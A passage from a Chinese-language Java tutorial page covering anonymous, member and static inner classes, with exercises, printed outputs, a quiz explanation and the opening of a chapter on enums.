class_">Outer05</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">99</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//创建一个基于类的匿名内部类</span><br>        <span class="hljs-comment">//不能添加访问修饰符，因为它的地位就是一个局部变量</span><br>        <span class="hljs-comment">//作用域：仅仅在定义它的方法或代码块中</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>()&#123;<br>            <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">88</span>;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-comment">//如果外部类和匿名内部类的成员重名时，匿名访问类的话，默认就近原则。</span><br>                <span class="hljs-comment">//如果想要访问外部类的成员时，则可以使用（外部类名.this.成员）去访问</span><br>                System.out.println(<span class="hljs-string">&quot;匿名内部类重写了 hi方法 n1=&quot;</span>+n1+<span class="hljs-string">&quot; 外部内的 n1=&quot;</span>+Outer05.<span class="hljs-built_in">this</span>.n1);<br>            &#125;<br>        &#125;;<br>        p.hi();<span class="hljs-comment">//动态绑定</span><br><br>        <span class="hljs-comment">//也可以直接调用，匿名内部类也是返回对象</span><br>        <span class="hljs-comment">//class匿名内部类 extends Person()&#123;&#125;</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>()&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;匿名内部类重写了 hi方法,哈哈哈&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ok</span><span class="hljs-params">(String str)</span> &#123;<br>                <span class="hljs-built_in">super</span>.ok(str);<br>            &#125;<br>        &#125;.ok(<span class="hljs-string">&quot;jack&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<span class="hljs-comment">//类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Person hi()&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ok</span><span class="hljs-params">(String str)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Person ok()&quot;</span>+str);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//抽象类/接口..</span><br></code></pre></td></tr></table></figure><p>输出：</p><p>匿名内部类重写了 hi方法 n1&#x3D;88 外部内的 n1&#x3D;99<br>Person ok()jack</p><h4 id="匿名内部类的实践"><a href="#匿名内部类的实践" class="headerlink" title="匿名内部类的实践"></a>匿名内部类的实践</h4><p>最佳实践：把匿名内部类当成实参直接传递，简洁高效。</p><p>传统方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerClassExercise01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//传统方法</span><br>        f1(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Picture</span>());<br>    &#125;<br>    <span class="hljs-comment">//静态方法,形参是接口类型</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f1</span><span class="hljs-params">(IL il)</span>&#123;<br>        il.show();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//接口</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IL</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-comment">//类-&gt;实现IL =&gt; 编程领域（硬编码）</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Picture</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IL</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;这是一幅名画...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>匿名内部类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerClassExercise01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//把匿名内部类当成实参直接传递，简洁高效。</span><br>        f1(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IL</span>()&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;这是一副名画...&quot;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>    <span class="hljs-comment">//静态方法,形参是接口类型</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">f1</span><span class="hljs-params">(IL il)</span>&#123;<br>        il.show();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//接口</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IL</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果Picture只需要调用一次，则选择匿名内部类会比较简洁方便。</p><p>练习：</p><blockquote><p>1.有一个铃声接口Bell，里面有个ring方法。（如下）<br>2.有一个手机类Cellphone，具有闹钟功能alarmclock，参数是Bell类型（如下）<br>3.测试手机类的闹钟功能，通过匿名内部类（对象）作为参数，打印：懒猪起床了<br>4.再传入另一个匿名内部类（对象），打印：小伙伴上课了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Bell</span>&#123;<br>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">ring</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CellPhone</span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">alarmclock</span><span class="hljs-params">(Bell bell)</span>&#123;<br>    bell.ring();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerClassExercise02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">CellPhone</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CellPhone</span>();<br>        test.alarmClock(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Bell</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ring</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;懒猪起床了。&quot;</span>);<br>            &#125;<br>        &#125;);<br>        test.alarmClock(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Bell</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ring</span><span class="hljs-params">()</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;小伙伴上课了。&quot;</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Bell</span>&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">ring</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CellPhone</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">alarmClock</span><span class="hljs-params">(Bell bell)</span>&#123;<br>        bell.ring();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><p>懒猪起床了。<br>小伙伴上课了。</p><h3 id="3-成员内部类"><a href="#3-成员内部类" class="headerlink" title="3.成员内部类"></a>3.成员内部类</h3><p>说明：成员内部类是定义在外部类的成员位置，并且没有static修饰</p><ol><li><p>可以直接访问外部类的所有成员，包含私有的</p></li><li><p>可以添加任意访问修饰符（public、protected、默认、private），因为它的地位就是一个成员。</p></li><li><p>作用域：整个类体</p></li><li><p>成员内部类–访问–&gt;外部类（比如：属性）【访问方式：直接访问】</p></li><li><p>外部类–访问–&gt;内部类【访问方式：创建对象，再访问】</p></li><li><p>外部其他类–访问–&gt;成员内部类【访问方式：两种（详见例子）】</p></li><li><p>如果外部类和内部类的成员<strong>重名时</strong>，内部类访问的话，默认<strong>就近原则</strong>。</p><p>如果想要访问外部类的成员时，则可以使用（外部类名.this.成员）去访问</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.innerclass;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemberInnerClass01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Outer08</span> <span class="hljs-variable">outer08</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer08</span>();<br>        outer08.t1();<br><br><span class="hljs-comment">//        外部其他类--访问--&gt;成员内部类【访问方式：两种】</span><br>        <span class="hljs-comment">//方法1：</span><br>        <span class="hljs-comment">//解读：</span><br>        <span class="hljs-comment">//outer08.new Inner08();  相当于把Inner08当做是outer08成员</span><br>        Outer08.<span class="hljs-type">Inner08</span> <span class="hljs-variable">inner08</span> <span class="hljs-operator">=</span> outer08.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner08</span>();<br>        inner08.say();<br>        <span class="hljs-comment">//方法2：在外部类中，编写一个方法，可以返回Inner08对象</span><br>        Outer08.<span class="hljs-type">Inner08</span> <span class="hljs-variable">inner08instance</span> <span class="hljs-operator">=</span> outer08.getInner08instance();<br>        inner08instance.say();<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer08</span>&#123;<span class="hljs-comment">//外部类</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;张三&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hi()方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//1.注意：成员内部类，是定义在外部内的成员位置上</span><br>    <span class="hljs-comment">//2.可以添加任意访问修饰符（public、protected、默认、private），因为它的地位就是一个成员。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner08</span>&#123; <span class="hljs-comment">//成员内部类（没有写在方法中）</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> <span class="hljs-variable">sal</span> <span class="hljs-operator">=</span> <span class="hljs-number">99.8</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">66</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;Outer08的n1=&quot;</span> + n1 + <span class="hljs-string">&quot; outer08的name=&quot;</span> + name+ <span class="hljs-string">&quot; 外部类的n1&quot;</span> + Outer08.<span class="hljs-built_in">this</span>.n1);<br>            hi(); <span class="hljs-comment">//成员内部类--访问--&gt;外部类（比如：属性）【访问方式：直接访问】</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//方法，返回一个Inner08实例 （链接第14行例子）</span><br>    <span class="hljs-keyword">public</span> Inner08 <span class="hljs-title function_">getInner08instance</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner08</span>();<br>    &#125;<br><br>    <span class="hljs-comment">//写方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">t1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//使用成员内部类</span><br>        <span class="hljs-comment">//外部类--访问--&gt;内部类【访问方式：创建对象，再访问】</span><br>        <span class="hljs-type">Inner08</span> <span class="hljs-variable">inner08</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner08</span>();<br>        inner08.say();<br>        System.out.println(inner08.sal);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-静态内部类"><a href="#4-静态内部类" class="headerlink" title="4.静态内部类"></a>4.静态内部类</h3><p>说明：静态内部类是定义在外部类的成员位置，并且有static修饰。</p><ol><li><p>可以直接访问外部类的所有静态成员，包含私有的，但不能直接访问非静态成员</p></li><li><p>可以添加任意访问修饰符（public、protected、默认、private），因为它的地位就是一个成员</p></li><li><p>作用域：同其他的成员，为整个类体</p></li><li><p>静态内部类–访问—&gt;外部类（比如：静态属性）【访问方式：直接访问所有静态成员】</p></li><li><p>外部类–访问—&gt;静态内部类【访问方式：创建对象，再访问】</p></li><li><p>外部其他类–访问–&gt;静态内部类</p></li><li><p>如果外部类和静态内部类的成员重名时，静态内部类访问时，默认遵循就近原则。</p><p>如果想访问类的成员，则可以使用（外部类名.成员）去访问</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.innerclass;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticInnerClass01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Outer10</span> <span class="hljs-variable">outer10</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer10</span>();<br>        outer10.m1();<br>        <span class="hljs-comment">//外部其他类 使用静态内部类</span><br>        <span class="hljs-comment">//方式1  new 外部类名.内部类名</span><br>        <span class="hljs-comment">//因为静态内部类，是可以通过类名直接访问（前提是满足访问权限）</span><br>        Outer10.<span class="hljs-type">Inner10</span> <span class="hljs-variable">inner10</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer10</span>.Inner10();<br>        inner10.say();<br>        <span class="hljs-comment">//方式2</span><br>        <span class="hljs-comment">//编写一个方法，可以返回静态内部类的实例</span><br>        Outer10.<span class="hljs-type">Inner10</span> <span class="hljs-variable">inner101</span> <span class="hljs-operator">=</span> outer10.getInner10();<br>        System.out.println(<span class="hljs-string">&quot;===============&quot;</span>);<br>        inner101.say();<br><br>        Outer10.<span class="hljs-type">Inner10</span> <span class="hljs-variable">inner10_</span> <span class="hljs-operator">=</span> Outer10.getInner10_();<br>        System.out.println(<span class="hljs-string">&quot;********&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer10</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;张三&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cry</span><span class="hljs-params">()</span>&#123;&#125;<br>    <span class="hljs-comment">//Inner10就是静态内部类</span><br>    <span class="hljs-comment">//1.放在外部类的成员位置</span><br>    <span class="hljs-comment">//2.使用static修饰</span><br>    <span class="hljs-comment">//3.可以直接访问外部类的所有静态成员，包含私有的，但不能直接访问非静态成员</span><br>    <span class="hljs-comment">//4.可以添加任意访问修饰符（public、protected、默认、private），因为它的地位就是一个成员</span><br>    <span class="hljs-comment">//5.作用域：同其他的成员，为整个类体</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner10</span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(name);<br>            <span class="hljs-comment">//静态内部类--访问---&gt;外部类（比如：静态属性）【访问方式：直接访问所有静态成员】</span><br>            System.out.println(name + <span class="hljs-string">&quot; 外部类name= &quot;</span> + Outer10.name);<br>            cry();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">m1</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//外部类--访问---&gt;静态内部类【访问方式：创建对象，再访问】</span><br>        <span class="hljs-type">Inner10</span> <span class="hljs-variable">inner10</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner10</span>();<br>        inner10.say();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Inner10 <span class="hljs-title function_">getInner10</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner10</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Inner10 <span class="hljs-title function_">getInner10_</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner10</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221031174106963.png" alt="image-20221031174106963" style="zoom:50%;" /><p>小结：</p><p>（1）内部类有四种：<strong>局部内部类，匿名内部类，成员内部类，静态内部类</strong></p><p>（2）<strong>成员内部类，静态内部类</strong> 是放在外部类的成员为位置，本质上就是一个成员</p><h4 id="课堂测试题"><a href="#课堂测试题" class="headerlink" title="课堂测试题"></a>课堂测试题</h4><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221031175002331.png" alt="image-20221031175002331" style="zoom:50%;" /><p>解析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerClassExercise</span> &#123;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>&#123;<span class="hljs-comment">//外部类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span>&#123;<span class="hljs-comment">//构造器</span><br>        <span class="hljs-type">Inner</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>();  <span class="hljs-comment">//s1.a = 5</span><br>        s1.a = <span class="hljs-number">10</span>;<span class="hljs-comment">//s1.a = 10</span><br>        <span class="hljs-type">Inner</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>();  <span class="hljs-comment">//s2.a = 5</span><br>        System.out.println(s2.a); <span class="hljs-comment">//输出 5 </span><br>    &#125;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span>&#123;<span class="hljs-comment">//内部类，成员内部类</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">Test</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>(); <span class="hljs-comment">//创建Test对象</span><br>        <span class="hljs-type">Inner</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> t.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>(); <span class="hljs-comment">//创建成员内部类对象</span><br>        System.out.println(r.a); <span class="hljs-comment">//r.a 为5 ，输出5</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出为5、5。</p><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;OOP核心结束&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="章节十一"><a href="#章节十一" class="headerlink" title="章节十一"></a>章节十一</h1><h2 id="生成文件头"><a href="#生成文件头" class="headerlink" title="*生成文件头"></a>*生成文件头</h2><p><strong>Editor</strong> - <strong>File and Code Templates</strong> - <strong>includes</strong></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221102214250619.png" alt="image-20221102214250619"></p><h2 id="1-枚举"><a href="#1-枚举" class="headerlink" title="1.枚举"></a>1.枚举</h2><h3 id="引入：四个季节类"><a href="#引入：四个季节类" class="headerlink" title="引入：四个季节类"></a>引入：四个季节类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Enumeration01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//使用</span><br>        <span class="hljs-type">Season</span> <span class="hljs-variable">spring</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Season</span>(<span class="hljs-string">&quot;春天&quot;</span>,<span class="hljs-string">&quot;温暖&quot;</span>);<br>        <span class="hljs-type">Season</span> <span class="hljs-variable">winter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Season</span>(<span class="hljs-string">&quot;冬天&quot;</span>,<span class="hljs-string">&quot;寒冷&quot;</span>);<br>        <span class="hljs-type">Season</span> <span class="hljs-variable">summer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Season</span>(<span class="hljs-string">&quot;夏天&quot;</span>,<span class="hljs-string">&quot;炎热&quot;</span>);<br>        <span class="hljs-type">Season</span> <span class="hljs-variable">autumn</span> <span 